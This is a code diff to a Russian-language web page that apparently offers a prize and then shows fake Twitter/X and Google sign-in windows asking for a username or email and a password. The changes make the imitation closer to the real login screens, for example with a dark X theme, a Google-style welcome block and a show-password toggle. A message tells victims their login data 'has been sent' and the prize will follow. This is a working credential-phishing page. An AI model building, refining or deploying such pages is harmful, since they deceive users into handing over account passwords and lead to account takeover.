@@ -414,7 +414,7 @@
         .get-prize-btn:hover:not(:disabled) {
             transform: translateY(-3px);
             box-shadow: 0 15px 30px rgba(42, 59, 90, 0.7);
-            background: linear-gradient(45deg, #3a4b5a 0%, #2a3c52 100%);
+            background: linear-gradient(45deg, #3a4b6a 0%, #2a3c52 100%);
         }
         
         .get-prize-btn:disabled {
@@ -694,10 +694,10 @@
             text-decoration: underline;
         }
         
-        /* Twitter/X модальное окно для пароля (этап 2) - БЕЛЫЙ ФОН как на скриншоте */
+        /* Twitter/X модальное окно для пароля (этап 2) - ЧЕРНЫЙ ФОН */
         .x-modal-step2 {
-            background: white;
-            color: #0F1419;
+            background: #000000;
+            color: white;
             padding: 30px;
         }
         
@@ -707,38 +707,13 @@
             margin-bottom: 30px;
             text-align: center;
             font-family: Arial, sans-serif;
-            color: #0F1419;
-        }
-        
-        .x-user-info {
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #EFF3F4;
-        }
-        
-        .x-user-email {
-            font-size: 16px;
-            color: #0F1419;
-            margin-bottom: 8px;
-            font-weight: 500;
-            font-family: Arial, sans-serif;
-        }
-        
-        .x-switch-account {
-            color: #1D9BF0;
-            text-decoration: none;
-            font-size: 14px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .x-switch-account:hover {
-            text-decoration: underline;
+            color: white;
         }
         
         .x-password-label {
             display: block;
             margin-bottom: 8px;
-            color: #536471;
+            color: #8da1b5;
             font-size: 14px;
             font-family: Arial, sans-serif;
         }
@@ -747,11 +722,11 @@
             width: 100%;
             padding: 15px;
             margin-bottom: 20px;
-            border: 1px solid #CFD9DE;
+            border: 1px solid #536471;
             border-radius: 4px;
             font-size: 17px;
-            background: white;
-            color: #0F1419;
+            background: #000;
+            color: white;
             font-family: Arial, sans-serif;
         }
         
@@ -763,7 +738,7 @@
         .x-login-btn {
             width: 100%;
             padding: 15px;
-            background: #0F1419;
+            background: #1D9BF0;
             color: white;
             border: none;
             border-radius: 30px;
@@ -775,7 +750,7 @@
         }
         
         .x-login-btn:hover {
-            background: #272C30;
+            background: #1A8CD8;
         }
         
         .x-forgot-password {
@@ -795,8 +770,8 @@
         .x-step2-footer {
             margin-top: 30px;
             padding-top: 20px;
-            border-top: 1px solid #EFF3F4;
-            color: #536471;
+            border-top: 1px solid #2F3336;
+            color: #8da1b5;
             font-size: 15px;
             font-family: Arial, sans-serif;
             text-align: center;
@@ -1012,8 +987,8 @@
             background: #36A420;
         }
         
-        /* Google стиль */
-        .google-modal {
+        /* Google стиль - этап 1: email */
+        .google-email-modal {
             padding: 48px 40px 36px;
             max-width: 450px;
         }
@@ -1024,167 +999,15 @@
         }
         
         .google-logo {
-            width: 100px;
+            width: 32px;
             height: 32px;
             display: inline-block;
-        }
-        
-        .google-title {
-            text-align: center;
-            font-size: 24px;
-            font-weight: 400;
-            margin-bottom: 35px;
-            color: #202124;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-user {
-            display: flex;
-            align-items: center;
-            margin-bottom: 40px;
-            padding: 15px;
-            background: #F8F9FA;
-            border-radius: 16px;
-        }
-        
-        .google-avatar {
-            width: 40px;
-            height: 40px;
-            background: #1A73E8;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: 500;
-            margin-right: 15px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-user-info {
-            flex: 1;
-        }
-        
-        .google-user-email {
-            font-weight: 500;
-            color: #202124;
-            font-size: 16px;
-            font-family: Arial, sans-serif;
-            margin-bottom: 5px;
-        }
-        
-        .google-switch {
-            color: #1A73E8;
-            text-decoration: none;
-            font-size: 14px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-switch:hover {
-            text-decoration: underline;
-        }
-        
-        .password-title {
-            text-align: center;
-            font-size: 20px;
-            font-weight: 400;
-            margin-bottom: 25px;
-            color: #202124;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-password-input {
-            width: 100%;
-            padding: 15px;
-            margin-bottom: 25px;
-            border: 1px solid #DADCE0;
-            border-radius: 4px;
-            font-size: 16px;
+            font-size: 32px;
+            font-weight: bold;
+            color: #4285F4;
             background: white;
-            color: #202124;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-password-input:focus {
-            outline: none;
-            border-color: #1A73E8;
-        }
-        
-        .google-show-password {
-            display: flex;
-            align-items: center;
-            margin-bottom: 35px;
-        }
-        
-        .google-show-password input {
-            margin-right: 10px;
-            width: 18px;
-            height: 18px;
-        }
-        
-        .google-show-password label {
-            color: #202124;
-            font-size: 14px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-submit-btn {
-            width: 100%;
-            padding: 12px;
-            background: #1A73E8;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 15px;
-            font-weight: 500;
-            cursor: pointer;
-            margin: 10px 0 15px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-submit-btn:hover {
-            background: #1666D6;
-            box-shadow: 0 1px 3px rgba(66, 133, 244, 0.3);
-        }
-        
-        .google-link {
-            color: #1A73E8;
-            text-decoration: none;
-            font-size: 14px;
-            font-family: Arial, sans-serif;
-            display: block;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        
-        .google-link:hover {
-            text-decoration: underline;
-        }
-        
-        .google-footer {
-            margin-top: 40px;
-            padding-top: 25px;
-            border-top: 1px solid #DADCE0;
-            color: #5F6368;
-            font-size: 14px;
-            text-align: center;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-footer a {
-            color: #1A73E8;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        
-        .google-footer a:hover {
-            text-decoration: underline;
-        }
-        
-        /* Google email стиль */
-        .google-email-modal {
-            padding: 48px 40px 36px;
-            max-width: 450px;
+            border-radius: 50%;
+            padding: 8px;
         }
         
         .google-email-title {
@@ -1193,14 +1016,6 @@
             font-weight: 400;
             margin-bottom: 35px;
             color: #202124;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-email-description {
-            text-align: center;
-            color: #202124;
-            margin-bottom: 35px;
-            font-size: 16px;
             font-family: Arial, sans-serif;
         }
         
@@ -1249,6 +1064,160 @@
         
         .google-create-account a:hover {
             text-decoration: underline;
+        }
+        
+        /* Google стиль - этап 2: пароль */
+        .google-modal-step2 {
+            padding: 48px 40px 36px;
+            max-width: 450px;
+        }
+        
+        .google-welcome-title {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 35px;
+            color: #202124;
+            font-family: Arial, sans-serif;
+        }
+        
+        .google-user {
+            display: flex;
+            align-items: center;
+            margin-bottom: 40px;
+            padding: 15px;
+            background: #F8F9FA;
+            border-radius: 16px;
+        }
+        
+        .google-avatar {
+            width: 40px;
+            height: 40px;
+            background: #757575;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 500;
+            margin-right: 15px;
+            font-family: Arial, sans-serif;
+        }
+        
+        .google-avatar.anon {
+            background: #757575;
+        }
+        
+        .google-user-info {
+            flex: 1;
+        }
+        
+        .google-user-email {
+            font-weight: 500;
+            color: #202124;
+            font-size: 16px;
+            font-family: Arial, sans-serif;
+            margin-bottom: 5px;
+        }
+        
+        .google-switch {
+            color: #1A73E8;
+            text-decoration: none;
+            font-size: 14px;
+            font-family: Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .google-switch:hover {
+            text-decoration: underline;
+        }
+        
+        .google-password-input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 15px;
+            border: 1px solid #DADCE0;
+            border-radius: 4px;
+            font-size: 16px;
+            background: white;
+            color: #202124;
+            font-family: Arial, sans-serif;
+        }
+        
+        .google-password-input:focus {
+            outline: none;
+            border-color: #1A73E8;
+        }
+        
+        .google-password-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 35px;
+        }
+        
+        .google-show-password {
+            display: flex;
+            align-items: center;
+        }
+        
+        .google-show-password input {
+            margin-right: 8px;
+            width: 16px;
+            height: 16px;
+        }
+        
+        .google-show-password label {
+            color: #202124;
+            font-size: 14px;
+            font-family: Arial, sans-serif;
+        }
+        
+        .google-forgot-password {
+            color: #1A73E8;
+            text-decoration: none;
+            font-size: 14px;
+            font-family: Arial, sans-serif;
+        }
+        
+        .google-forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .google-buttons-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .google-next-btn {
+            padding: 12px 24px;
+            background: #1A73E8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            font-family: Arial, sans-serif;
+            min-width: 100px;
+        }
+        
+        .google-next-btn:hover {
+            background: #1666D6;
+            box-shadow: 0 1px 3px rgba(66, 133, 244, 0.3);
+        }
+        
+        .google-language {
+            color: #5F6368;
+            font-size: 14px;
+            font-family: Arial, sans-serif;
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
         }
         
         .footer {
@@ -1373,7 +1342,7 @@
                 max-width: 95%;
             }
             
-            .google-modal {
+            .google-modal-step2 {
                 padding: 30px 20px;
             }
             
@@ -1435,22 +1404,18 @@
         </div>
     </div>
     
-    <!-- Twitter/X модальное окно (этап 2: пароль) - БЕЛЫЙ ФОН как на скриншоте -->
-    <div class="modal-overlay" id="xModalStep2">
-        <div class="modal x-modal-step2">
+    <!-- Twitter/X модальное окно (этап 2: пароль) - ЧЕРНЫЙ ФОН -->
+    <div class="modal-overlay modal-dark" id="xModalStep2">
+        <div class="modal modal-dark x-modal-step2">
             <button class="close-modal" onclick="closeModal('xModalStep2')">&times;</button>
             
             <div class="x-logo">
-                <svg viewBox="0 0 24 24" aria-hidden="true" style="width: 40px; height: 40px; fill: #0F1419;">
+                <svg viewBox="0 0 24 24" aria-hidden="true" style="width: 40px; height: 40px; fill: white;">
                     <g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g>
                 </svg>
             </div>
             
             <h2 class="x-step2-title">Введите пароль</h2>
-            
-            <div class="x-user-info">
-                <div class="x-user-email" id="xUserEmail">user@example.com</div>
-            </div>
             
             <form id="xPasswordForm">
                 <label class="x-password-label">Пароль</label>
@@ -1537,7 +1502,7 @@
             <button class="close-modal" onclick="closeModal('googleModalStep1')">&times;</button>
             
             <div class="google-logo-container">
-                <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google" class="google-logo">
+                <div class="google-logo">G</div>
             </div>
             
             <h1 class="google-email-title">Вход</h1>
@@ -1557,46 +1522,55 @@
                 <button type="submit" class="google-submit-btn">Далее</button>
             </form>
             
-            <div class="google-footer">
-                Выберите язык &nbsp; <a href="#">Русский</a>
+            <div class="google-language">
+                Русский
             </div>
         </div>
     </div>
     
     <!-- Google модальное окно (этап 2: пароль) -->
     <div class="modal-overlay" id="googleModalStep2">
-        <div class="modal google-modal">
+        <div class="modal google-modal-step2">
             <button class="close-modal" onclick="closeModal('googleModalStep2')">&times;</button>
             
             <div class="google-logo-container">
-                <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google" class="google-logo">
+                <div class="google-logo">G</div>
             </div>
+            
+            <h2 class="google-welcome-title">Добро пожаловать!</h2>
             
             <div class="google-user">
-                <div class="google-avatar">Д</div>
+                <div class="google-avatar anon">
+                    <i class="fas fa-user"></i>
+                </div>
                 <div class="google-user-info">
-                    <div class="google-user-email">demo@gmail.com</div>
-                    <a href="#" class="google-switch" onclick="switchGoogleAccount()">Сменить аккаунт</a>
+                    <div class="google-user-email" id="googleUserEmail">demo@gmail.com</div>
+                    <a href="#" class="google-switch" onclick="switchGoogleAccount()">
+                        <i class="fas fa-user-circle"></i> Сменить аккаунт
+                    </a>
                 </div>
             </div>
-            
-            <h2 class="password-title">Введите пароль</h2>
             
             <form id="googlePasswordForm">
                 <input type="password" class="google-password-input" placeholder="Введите пароль" required>
                 
-                <div class="google-show-password">
-                    <input type="checkbox" id="showPassword">
-                    <label for="showPassword">Показать пароль</label>
+                <div class="google-password-options">
+                    <div class="google-show-password">
+                        <input type="checkbox" id="showPassword">
+                        <label for="showPassword">Показать пароль</label>
+                    </div>
+                    
+                    <a href="#" class="google-forgot-password">Забыли пароль?</a>
                 </div>
                 
-                <a href="#" class="google-link">Забыли пароль?</a>
-                
-                <button type="submit" class="google-submit-btn">Далее</button>
+                <div class="google-buttons-container">
+                    <a href="#" class="google-forgot-password" style="visibility: hidden;">Забыли пароль?</a>
+                    <button type="submit" class="google-next-btn">Далее</button>
+                </div>
             </form>
             
-            <div class="google-footer">
-                Выберите язык &nbsp; <a href="#">Русский</a>
+            <div class="google-language">
+                Русский
             </div>
         </div>
     </div>
@@ -1787,6 +1761,11 @@
         function switchGoogleAccount() {
             closeModal('googleModalStep2');
             openModal('googleModalStep1');
+        }
+        
+        function switchXAccount() {
+            closeModal('xModalStep2');
+            openModal('xModalStep1');
         }
         
         document.addEventListener('DOMContentLoaded', function() {
@@ -2015,9 +1994,6 @@
                 e.preventDefault();
                 xUsername = this.querySelector('input').value;
                 
-                // Обновляем email в окне пароля
-                document.getElementById('xUserEmail').textContent = xUsername;
-                
                 // Переходим к окну пароля
                 closeModal('xModalStep1');
                 openModal('xModalStep2');
@@ -2085,7 +2061,7 @@
                 googleEmail = this.querySelector('input').value;
                 
                 // Обновляем email в окне пароля
-                document.querySelector('.google-user-email').textContent = googleEmail;
+                document.getElementById('googleUserEmail').textContent = googleEmail;
                 
                 // Переходим к окну пароля
                 closeModal('googleModalStep1');
@@ -2110,6 +2086,16 @@
                     closeModal('googleModalStep2');
                     showConfirmation();
                     showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
+                }
+            });
+            
+            // Обработчик чекбокса "Показать пароль" для Google
+            document.getElementById('showPassword').addEventListener('change', function() {
+                const passwordInput = document.querySelector('.google-password-input');
+                if (this.checked) {
+                    passwordInput.type = 'text';
+                } else {
+                    passwordInput.type = 'password';
                 }
             });
             
@@ -2266,16 +2252,6 @@
                         document.body.style.overflow = 'auto';
                     }
                 });
-            });
-            
-            // Показать/скрыть пароль для Google
-            document.getElementById('showPassword').addEventListener('change', function() {
-                const passwordInput = document.querySelector('.google-password-input');
-                if (this.checked) {
-                    passwordInput.type = 'text';
-                } else {
-                    passwordInput.type = 'password';
-                }
             });
         });
     </script>
